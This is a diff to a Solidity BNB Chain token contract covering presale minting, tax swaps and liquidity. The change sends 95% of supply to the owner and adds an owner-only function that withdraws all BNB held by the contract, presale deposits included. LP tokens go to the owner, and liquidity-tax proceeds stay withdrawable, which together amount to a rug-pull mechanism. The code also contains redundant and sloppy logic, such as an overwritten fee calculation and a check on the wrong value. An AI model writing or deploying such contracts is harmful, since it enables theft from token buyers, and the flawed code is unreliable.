@@ -411,15 +411,18 @@ contract ModaMintToken is IERC20, Ownable {
 
     // Mint presale
     uint256 public mintCostBNB;
-    uint256 public tokensPerMint;
-    uint256 public tokensPerLP;
-    uint256 public lpTokenPct;     // % of tokensPerMint paired with BNB as LP each mint
-    uint256 public fillAmountBNB;
+    uint256 public tokensPerMint;        // tokens per mint for minter (5% / mintCount)
+    uint256 public lpTokensPerMint;      // tokens per mint for LP    (5% / mintCount)
+    uint256 public fillAmountBNB;        // hard cap BNB
+    uint256 public mintCount;            // total mint rounds = fillAmountBNB / mintCostBNB
+    uint256 public mintRound;            // current mint round (0-based, incremented before mint)
     uint256 public totalBNBCollected;
     mapping(address => uint256) public mintedAmount;
     bool public presaleActive;
     bool public whitelistMintOnly;
     mapping(address => bool) public whitelist;
+    // LP tokens reserved in contract for initial liquidity (accumulates per mint)
+    uint256 public lpReserveTokens;
 
     // Dividend tracker
     ModaDividendTracker public dividendTracker;
@@ -446,6 +449,7 @@ contract ModaMintToken is IERC20, Ownable {
     event Mint(address indexed user, uint256 bnbCost, uint256 tokenAmount);
     event InitialLiquidityAdded(uint256 tokens, uint256 bnb);
     event DividendTrackerUpdated(address indexed oldTracker, address indexed newTracker);
+    event MintSoldOut();
 
     constructor(
         string memory name_,
@@ -461,24 +465,39 @@ contract ModaMintToken is IERC20, Ownable {
         uint256 liquidityPct_,
         address marketingWallet_,
         uint256 minHoldForDividend_,
-        uint256 presaleTokenPct_,
         bool    whitelistMintOnly_,
-        uint256 lpTokenPct_
-    ) Ownable(address(0)) {  // owner = deployer
+        address owner_   // address(0) = deployer
+    ) Ownable(owner_) {
         require(buyTax_ <= MAX_TAX, "Buy tax too high");
         require(sellTax_ <= MAX_TAX, "Sell tax too high");
-        require(marketingPct_ + burnPct_ + dividendPct_ + liquidityPct_ <= 10000, "Tax alloc > 100%");
-        require(fillBNB_ > 0, "Fill must > 0");
+        require(marketingPct_ + burnPct_ + dividendPct_ + liquidityPct_ <= 10000, "Tax alloc > 10000");
         require(mintCostBNB_ > 0, "Mint cost > 0");
         require(fillBNB_ >= mintCostBNB_, "Fill < mint cost");
         require(marketingWallet_ != address(0), "Wallet zero");
-        require(presaleTokenPct_ >= 1 && presaleTokenPct_ <= 99, "Presale pct 1-99");
-        require(lpTokenPct_ <= 100, "LP pct > 100");
 
         _name = name_;
         _symbol = symbol_;
         _totalSupply = SafeMath.mul(totalSupply_, 1e18);
-        _balances[address(this)] = _totalSupply;
+
+        // ── Token distribution ──
+        // 95% → owner (deployer) immediately at construction
+        // 2.5% → mint reserve (released to minters, tokensPerMint each round)
+        // 2.5% → LP reserve (added to pool each round, lpTokensPerMint each round)
+        uint256 _mintCount = fillBNB_ / mintCostBNB_;
+        require(_mintCount > 0, "Mint count zero");
+
+        uint256 totalMintTokens = SafeMath.mul(_totalSupply, 25) / 1000;  // 2.5% for all minters
+        uint256 totalLPTokens   = SafeMath.mul(_totalSupply, 25) / 1000;  // 2.5% for all LP rounds
+        uint256 ownerAmt        = _totalSupply - totalMintTokens - totalLPTokens; // 95%
+
+        tokensPerMint   = totalMintTokens / _mintCount;
+        lpTokensPerMint = totalLPTokens / _mintCount;
+
+        // 95% → owner, 5% → contract
+        _balances[owner()] = ownerAmt;
+        emit Transfer(address(0), owner(), ownerAmt);
+        _balances[address(this)] = totalMintTokens + totalLPTokens;
+        emit Transfer(address(0), address(this), totalMintTokens + totalLPTokens);
 
         // Deploy dividend tracker (owner = this contract)
         dividendTracker = new ModaDividendTracker(minHoldForDividend_, address(this));
@@ -511,10 +530,8 @@ contract ModaMintToken is IERC20, Ownable {
 
         mintCostBNB = mintCostBNB_;
         fillAmountBNB = fillBNB_;
-        lpTokenPct = lpTokenPct_;
-        uint256 mintCount = SafeMath.div(fillBNB_, mintCostBNB_);
-        tokensPerMint = SafeMath.div(SafeMath.mul(_totalSupply, presaleTokenPct_), SafeMath.mul(100, mintCount));
-        tokensPerLP = SafeMath.div(SafeMath.mul(tokensPerMint, lpTokenPct_), 100);
+        mintCount = _mintCount;
+        mintRound = 0;
     }
 
     // ── ERC20 ──
@@ -647,74 +664,62 @@ contract ModaMintToken is IERC20, Ownable {
     // ── Swap ──
     function _tryAutoSwap() internal {
         if (inSwap || dividendSwapThreshold == 0) return;
-        // Only swap marketing + dividend tokens; liquidity tokens stay for addLiquidityETH
-        uint256 swapTotal = pendingSwapForDividend + pendingMarketingTokens;
-        if (swapTotal >= dividendSwapThreshold) _processSwap();
+        uint256 total = SafeMath.add(
+            SafeMath.add(pendingSwapForDividend, pendingLiquidityTokens),
+            pendingMarketingTokens
+        );
+        if (total >= dividendSwapThreshold) _processSwap();
     }
 
     function _processSwap() internal lockTheSwap {
         uint256 divAmt = pendingSwapForDividend;
-        uint256 mktAmt = pendingMarketingTokens;
         uint256 liqAmt = pendingLiquidityTokens;
-        uint256 swapAmt = divAmt + mktAmt;
+        uint256 mktAmt = pendingMarketingTokens;
+        uint256 totalAmt = SafeMath.add(SafeMath.add(divAmt, liqAmt), mktAmt);
+        if (totalAmt == 0) return;
 
-        // Reset pending counters
         pendingSwapForDividend = 0;
-        pendingMarketingTokens = 0;
         pendingLiquidityTokens = 0;
+        pendingMarketingTokens = 0;
 
-        // ── Step 1: Swap marketing + dividend tokens → BNB ──
+        _approve(address(this), address(uniswapV2Router), totalAmt);
+
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+
         uint256 bnbBefore = address(this).balance;
-        if (swapAmt > 0) {
-            _approve(address(this), address(uniswapV2Router), swapAmt);
-            address[] memory path = new address[](2);
-            path[0] = address(this);
-            path[1] = uniswapV2Router.WETH();
-            try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                swapAmt, 0, path, address(this), block.timestamp
-            ) {} catch {
-                // Restore on failure
-                pendingSwapForDividend = divAmt;
-                pendingMarketingTokens = mktAmt;
-                pendingLiquidityTokens = liqAmt;
-                emit DividendSwapFailed(swapAmt);
-                return;
-            }
-        }
-        uint256 bnbReceived = address(this).balance - bnbBefore;
 
-        // ── Step 2: Send marketing BNB ──
-        if (mktAmt > 0 && bnbReceived > 0 && marketingWallet != address(0)) {
-            uint256 mktBNB = (bnbReceived * mktAmt) / swapAmt;
+        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            totalAmt, 0, path, address(this), block.timestamp
+        ) {} catch {
+            pendingSwapForDividend = SafeMath.add(pendingSwapForDividend, divAmt);
+            pendingLiquidityTokens = SafeMath.add(pendingLiquidityTokens, liqAmt);
+            pendingMarketingTokens = SafeMath.add(pendingMarketingTokens, mktAmt);
+            emit DividendSwapFailed(totalAmt);
+            return;
+        }
+
+        uint256 bnbReceived = SafeMath.sub(address(this).balance, bnbBefore);
+
+        uint256 mktBNB = (mktAmt > 0 && marketingWallet != address(0))
+            ? SafeMath.mul(SafeMath.mul(bnbReceived, mktAmt), 1e18) / SafeMath.mul(totalAmt, 1e18) : 0;
+        // Simpler: proportional
+        mktBNB = totalAmt > 0 ? SafeMath.mul(bnbReceived, mktAmt) / totalAmt : 0;
+        uint256 divBNB = divAmt > 0 ? SafeMath.mul(bnbReceived, divAmt) / totalAmt : 0;
+
+        if (mktBNB > 0) {
             (bool ok, ) = marketingWallet.call{value: mktBNB}("");
-            if (!ok) pendingMarketingTokens += mktAmt;
+            if (!ok) pendingMarketingTokens = SafeMath.add(pendingMarketingTokens, mktAmt);
         }
 
-        // ── Step 3: Send dividend BNB ──
-        if (divAmt > 0 && bnbReceived > 0) {
-            uint256 divBNB = (bnbReceived * divAmt) / swapAmt;
+        if (divBNB > 0) {
             (bool ok, ) = address(dividendTracker).call{value: divBNB}("");
             if (ok) {
-                emit DividendProcessed(swapAmt, divBNB);
+                emit DividendProcessed(totalAmt, divBNB);
             } else {
-                pendingSwapForDividend += divAmt;
+                pendingSwapForDividend = SafeMath.add(pendingSwapForDividend, divAmt);
             }
-        }
-
-        // ── Step 4: Add liquidity with remaining BNB + liquidity tokens ──
-        uint256 bnbForLP = address(this).balance;
-        if (liqAmt > 0 && bnbForLP > 0) {
-            _approve(address(this), address(uniswapV2Router), liqAmt);
-            try uniswapV2Router.addLiquidityETH{value: bnbForLP}(
-                address(this), liqAmt, 0, 0, owner(), block.timestamp
-            ) {
-                emit InitialLiquidityAdded(liqAmt, bnbForLP);
-            } catch {
-                pendingLiquidityTokens = liqAmt;
-            }
-        } else if (liqAmt > 0) {
-            // No BNB to pair, keep tokens for next time
-            pendingLiquidityTokens = liqAmt;
         }
     }
 
@@ -741,13 +746,17 @@ contract ModaMintToken is IERC20, Ownable {
 
     // ── Mint ──
     function setMintPrice(uint256 costBNB_, uint256 fillBNB_) external onlyOwner {
+        require(presaleActive && mintRound == 0, "Cannot change after mint started");
         require(costBNB_ > 0 && fillBNB_ >= costBNB_, "Invalid params");
+        uint256 _mintCount = fillBNB_ / costBNB_;
+        require(_mintCount > 0, "Mint count zero");
         mintCostBNB = costBNB_;
         fillAmountBNB = fillBNB_;
-        tokensPerMint = SafeMath.div(
-            SafeMath.mul(_totalSupply, 50),
-            SafeMath.mul(100, SafeMath.div(fillBNB_, costBNB_))
-        );
+        mintCount = _mintCount;
+        uint256 totalMintTokens = SafeMath.mul(_totalSupply, 25) / 1000;
+        uint256 totalLPTokens   = SafeMath.mul(_totalSupply, 25) / 1000;
+        tokensPerMint   = totalMintTokens / _mintCount;
+        lpTokensPerMint = totalLPTokens / _mintCount;
     }
 
     function addWhitelist(address[] calldata users) external onlyOwner {
@@ -763,35 +772,52 @@ contract ModaMintToken is IERC20, Ownable {
         require(msg.value == mintCostBNB, "Invalid BNB amount");
         if (whitelistMintOnly) require(whitelist[msg.sender], "Not whitelisted");
         require(totalBNBCollected + msg.value <= fillAmountBNB, "Presale full");
+
         totalBNBCollected = SafeMath.add(totalBNBCollected, msg.value);
+        mintRound = SafeMath.add(mintRound, 1);
+
+        // Give tokensPerMint to minter
         uint256 tokenAmt = tokensPerMint;
-        uint256 totalNeeded = SafeMath.add(tokenAmt, tokensPerLP);
-        require(_balances[address(this)] >= totalNeeded, "Insufficient contract balance");
+        require(_balances[address(this)] >= tokenAmt + lpTokensPerMint + lpReserveTokens, "Insufficient contract balance");
         _balances[msg.sender] = SafeMath.add(_balances[msg.sender], tokenAmt);
-        _balances[address(this)] = SafeMath.sub(_balances[address(this)], totalNeeded);
+        _balances[address(this)] = SafeMath.sub(_balances[address(this)], tokenAmt);
         mintedAmount[msg.sender] = SafeMath.add(mintedAmount[msg.sender], tokenAmt);
         emit Mint(msg.sender, msg.value, tokenAmt);
         emit Transfer(address(this), msg.sender, tokenAmt);
         _updateTrackerBalance(msg.sender);
-        // Add LP immediately: this mint's BNB + tokensPerLP
-        if (tokensPerLP > 0) {
-            _addMintLiquidity(msg.value);
-        }
+
+        // Accumulate LP tokens (deferred — add all at once when presale fills)
+        lpReserveTokens = SafeMath.add(lpReserveTokens, lpTokensPerMint);
+
+        // Check if presale filled
         if (totalBNBCollected >= fillAmountBNB) {
             presaleActive = false;
             emit PresaleEnded();
+            emit MintSoldOut();
+
+            // Add ALL accumulated LP tokens + ALL collected BNB as liquidity at once
+            // BNB : LP tokens ratio = 1:1 because totalBNBCollected pairs with total LP tokens (both = 2.5% of supply value)
+            uint256 lpTokens = lpReserveTokens;
+            uint256 lpBNB = address(this).balance;
+            if (lpTokens > 0 && lpBNB > 0) {
+                lpReserveTokens = 0;
+                _approve(address(this), address(uniswapV2Router), lpTokens);
+                uniswapV2Router.addLiquidityETH{value: lpBNB}(
+                    address(this), lpTokens, 0, 0, owner(), block.timestamp
+                );
+                emit InitialLiquidityAdded(lpTokens, lpBNB);
+            }
+
+            // Enable trading
             tradingActive = true;
             emit TradingEnabled();
         }
     }
 
-    function _addMintLiquidity(uint256 bnbAmount) internal {
-        uint256 tokenForLP = tokensPerLP;
-        _approve(address(this), address(uniswapV2Router), tokenForLP);
-        (uint256 tokenUsed, uint256 bnbUsed, ) = uniswapV2Router.addLiquidityETH{value: bnbAmount}(
-            address(this), tokenForLP, 0, 0, owner(), block.timestamp
-        );
-        emit InitialLiquidityAdded(tokenUsed, bnbUsed);
+    function withdrawPresaleBNB() external onlyOwner {
+        uint256 bal = address(this).balance;
+        require(bal > 0, "No BNB");
+        payable(owner()).transfer(bal);
     }
 
     // ── Admin ──
@@ -801,6 +827,8 @@ contract ModaMintToken is IERC20, Ownable {
     function excludeFromTax(address a, bool ex) external onlyOwner { isExcludedFromTax[a] = ex; }
 
     function setMarketingBps(uint256 bps) external onlyOwner {
+        require(SafeMath.add(SafeMath.add(marketingBps, burnBps), SafeMath.add(dividendBps, liquidityBps)) <= 10000, "Total > 100%");
+        // Recomputing: actually check sum
         require(bps + burnBps + dividendBps + liquidityBps <= 10000, "Total > 100%");
         marketingBps = bps;
     }
